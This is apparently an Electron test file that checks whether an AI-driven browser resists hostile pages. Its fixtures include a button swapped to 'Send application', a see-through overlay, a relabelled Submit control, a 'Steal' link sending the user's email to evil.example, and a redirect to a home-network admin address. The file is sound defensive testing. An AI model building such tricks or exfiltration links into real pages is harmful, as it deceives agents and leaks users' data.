// AI lockdown (2026-10-14): a trick page cannot make a "free" click land on Send. Three tricks, played for real:
// the page swaps a harmless button for "Send application" after Claude read it; it lays a see-through layer over a
// button; it moves a control's number onto its Submit button. Plus: a bank address with a trailing dot, a redirect to
// the home network, and Enter on a spot with no number.
//
// Run: npx electron test/electron/lockdown-check.ts
import { app, BrowserWindow, screen } from 'electron';
import http from 'node:http';
import { mkdtempSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { servePages } from '../../src/pageserver.ts';
import { AangBrowser } from '../../src/browser.ts';

const SITE = 47931;
app.commandLine.appendSwitch('host-resolver-rules', `MAP www.linkedin.com 127.0.0.1:${SITE}, MAP shop.example 127.0.0.1:${SITE}, MAP evil.example 127.0.0.1:${SITE}`);
process.on('uncaughtException', (e) => { console.log('HARNESS NOTE ' + String((e as Error).message).split('\n')[0]); });
process.on('unhandledRejection', (e) => { console.log('HARNESS REJECTION ' + String((e as Error)?.stack ?? e)); app.exit(2); });
setTimeout(() => { console.log('HARNESS TIMEOUT'); app.exit(3); }, 120_000).unref();
app.on('window-all-closed', () => { /* the test decides */ });
const HERE = path.dirname(fileURLToPath(import.meta.url));
BrowserWindow.prototype.show = function (this: BrowserWindow) { this.setPosition(-6000, 100); this.showInactive(); };
BrowserWindow.prototype.focus = function () { /* not in a test */ };
let bad = 0;
const check = (what: string, ok: boolean, d = '') => { console.log(`${ok ? 'PASS' : 'FAIL'}  ${what}${d ? '  -- ' + d.slice(0, 220) : ''}`); if (!ok) bad++; };
const wait = (ms: number) => new Promise((r) => setTimeout(r, ms));
const PAGES: Record<string, string> = {
  '/swap': `<!doctype html><title>Swap</title><body><form action="/sent" method="post"><button type="button" id="b" onclick="document.title='clicked'">Show more</button></form>
    <script>setTimeout(() => { const b = document.getElementById('b'); b.type = 'submit'; b.textContent = 'Send application'; }, 3000);</script></body>`,
  '/cover': `<!doctype html><title>Cover</title><body><button id="b" onclick="document.title='clicked'" style="position:absolute;left:40px;top:40px;width:200px;height:60px">Show more</button>
    <div id="lay" style="position:absolute;left:0;top:0;width:600px;height:400px;opacity:0.01;z-index:9" onclick="document.title='trapped'"></div></body>`,
  '/move': `<!doctype html><title>Move</title><body><form action="/sent" method="post"><a href="#more" id="l">Read more</a> <button type="submit" id="s">Submit application</button></form>
    <script>setTimeout(() => { const l = document.getElementById('l'), s = document.getElementById('s'); s.setAttribute('data-aang-n', l.getAttribute('data-aang-n')); l.removeAttribute('data-aang-n'); }, 600);</script></body>`,
  '/hop': `<!doctype html><title>Hop</title><body><a id="h" href="/redir">Next page</a></body>`,
  '/li': `<!doctype html><title>LinkedIn</title><body><a id="o" href="http://shop.example:${SITE}/shop">A company site</a> <a id="x" href="http://evil.example:${SITE}/c?e=you%40example.com">Steal</a></body>`,
  '/form': `<!doctype html><title>Quick apply</title><body><input id="em" aria-label="Email"></body>`,
  '/enter': `<!doctype html><title>Enter</title><body><div tabindex="0" id="d" style="width:100px;height:40px">plain</div><script>document.getElementById('d').focus();</script></body>`,
};
app.whenReady().then(async () => {
  (screen as any).getCursorScreenPoint = () => ({ x: -20000, y: 500 });
  const site = http.createServer((q, r) => {
    if (q.url === '/redir') { r.writeHead(302, { Location: 'http://192.168.1.1/admin' }).end(); return; }
    const pathOnly = String(q.url).split('?')[0];
    if (pathOnly === '/shop') { r.writeHead(200, { 'Content-Type': 'text/html' }).end(`<title>cookie:${q.headers.cookie ?? 'none'}</title>`); return; }
    r.writeHead(200, { 'Content-Type': 'text/html' }).end(PAGES[pathOnly] ?? '<title>x</title>');
  });
  await new Promise<void>((r) => site.listen(SITE, '127.0.0.1', () => r()));
  const pages = await servePages(path.join(HERE, '..', '..', 'pages'));
  const b = new AangBrowser({ origin: pages.origin, stateDir: mkdtempSync(path.join(os.tmpdir(), 'lock-')), preloadPath: path.join(HERE, '..', '..', 'src', 'preload.cjs'),
    tabPreloadPath: path.join(HERE, '..', '..', 'src', 'tabpreload.cjs'), settingsPreloadPath: path.join(HERE, '..', '..', 'src', 'settingspreload.cjs'), thingsPreloadPath: path.join(HERE, '..', '..', 'src', 'thingspreload.cjs'), testLocal: true });
  const drive = (op: string, x: any): Promise<any> => b.drive(op, x) as Promise<any>;
  const base = `http://127.0.0.1:${SITE}`;
  const job = (await drive('start', { kind: 'claude', name: 'test' })).job;
  const go = async (p: string) => { const o = await drive('open', { job, url: base + p }); await wait(300); const r = await drive('read', { page: o.page }); return { page: o.page, items: r.items ?? [] }; };
  const title = (page: number) => (b as any).driver.page(page)?.title;

  { const { page, items } = await go('/swap');
    const btn = items.find((i: any) => i.label === 'Show more');
    check('the swap page reads as a harmless button', !!btn && btn.kind === 'button');
    await wait(3200);
    const c = await drive('click', { page, n: btn?.n });
    check('after the page swaps it for "Send application", the click stops and asks him', c.ok === false && c.needs === 'lever' && /Send application/.test(c.what ?? ''), JSON.stringify(c)); }

  { const { page, items } = await go('/cover');
    const btn = items.find((i: any) => i.label === 'Show more');
    const c = await drive('click', { page, n: btn?.n });
    check('a see-through layer over the button: not pressed', c.ok === false && /lying over/.test(c.error ?? '') && title(page) === 'Cover', JSON.stringify(c)); }

  { const { page, items } = await go('/move');
    const link = items.find((i: any) => i.label === 'Read more');
    await wait(900);
    const c = await drive('click', { page, n: link?.n });
    check('the page moving a number onto Submit changes nothing: the link it was is what gets clicked', c.ok === true && title(page) === 'Move', JSON.stringify(c).slice(0, 160)); }

  { const bank = await drive('open', { job, url: 'https://rbc.com./' }).catch((e: Error) => ({ ok: false, error: e.message }));
    check('a bank address with a trailing dot is refused', bank.ok === false && /bank/.test(bank.error ?? ''), JSON.stringify(bank)); }

  { const { page, items } = await go('/hop');
    const h = items.find((i: any) => i.label === 'Next page');
    await drive('click', { page, n: h?.n }); await wait(800);
    const p = (b as any).driver.page(page);
    check('a redirect to the home network is stopped', !/192\.168/.test(p?.url ?? '') && /192\.168/.test(p?.blocked ?? ''), `${p?.url} / ${p?.blocked}`); }

  { const { page } = await go('/enter');
    const k = await drive('key', { page, key: 'enter' });
    check('Enter on a spot with no number asks him', k.ok === false && k.needs === 'lever', JSON.stringify(k)); }

  // ---- the fences (G1, G2, G3): a job scan is signed in on the job sites only; elsewhere it is logged out
  {
    const scan = (await drive('start', { kind: 'claude', name: 'Job scan' })).job;
    await (b as any).ses.cookies.set({ url: `http://shop.example:${SITE}`, name: 'his', value: 'SECRET-LOGIN' });
    const li = await drive('open', { job: scan, url: `http://www.linkedin.com:${SITE}/li` }); await wait(300);
    check("LinkedIn is one of a job scan's own sites: signed in", li.ok && !li.guest, JSON.stringify(li).slice(0, 120));
    const r = await drive('read', { page: li.page });
    const toShop = r.items.find((i: any) => i.label === 'A company site'), steal = r.items.find((i: any) => i.label === 'Steal');
    const c = await drive('click', { page: li.page, n: toShop?.n }); await wait(800);
    const handed = /opened in page (\d+), logged out/.exec((c.changed ?? []).join(' '));
    const gp = handed ? (b as any).driver.page(Number(handed[1])) : null;
    check('a link to a site outside the job opens in its own page, logged out', !!handed && gp?.guest === true, (c.changed ?? []).join(' | '));
    check('and his login there is NOT sent', /cookie:none/.test(gp?.title ?? ''), gp?.title);
    const s2 = await drive('click', { page: li.page, n: steal?.n }); await wait(600);
    check('a link carrying his email to another site is stopped', /email address in the address, so it was stopped/.test((s2.changed ?? []).join(' ')), (s2.changed ?? []).join(' | '));
    const o2 = await drive('open', { job: scan, url: `http://evil.example:${SITE}/x?phone=416-555-0199` });
    check('opening an address with a phone number in it asks him', o2.ok === false && o2.needs === 'lever' && /phone number/.test(o2.what ?? ''), JSON.stringify(o2));
    const o3 = await drive('open', { job: scan, url: `http://shop.example:${SITE}/shop`, signedIn: true });
    check('using his login on a new site asks him once', o3.ok === false && o3.needs === 'lever' && /use your login on shop\.example/.test(o3.what ?? ''), JSON.stringify(o3));
    const o4 = await drive('open', { job: scan, url: `http://shop.example:${SITE}/shop`, signedIn: true, allowed: true }); await wait(300);
    check('after his yes, it is signed in there', o4.ok && !o4.guest && /SECRET-LOGIN/.test((b as any).driver.page(o4.page)?.title ?? ''), (b as any).driver.page(o4.page)?.title);
    const f = await drive('open', { job: scan, url: `http://evil.example:${SITE}/form` }); await wait(300);
    const fr = await drive('read', { page: f.page });
    const em = fr.items.find((i: any) => i.kind === 'text');
    const t = await drive('type', { page: f.page, n: em?.n, text: 'you@example.com' });
    check('typing his email into a field on a site outside the job asks him', t.ok === false && t.needs === 'lever' && /email address/.test(t.what ?? ''), JSON.stringify(t));
    const t2 = await drive('type', { page: f.page, n: em?.n, text: 'customer success' });
    check('ordinary words still type freely', t2.ok === true, JSON.stringify(t2).slice(0, 100));
  }
  (b as any).closeAll?.(); site.close(); pages.close();
  console.log(bad ? `${bad} failed` : 'all passed');
  setTimeout(() => app.exit(bad ? 1 : 0), 500);
});
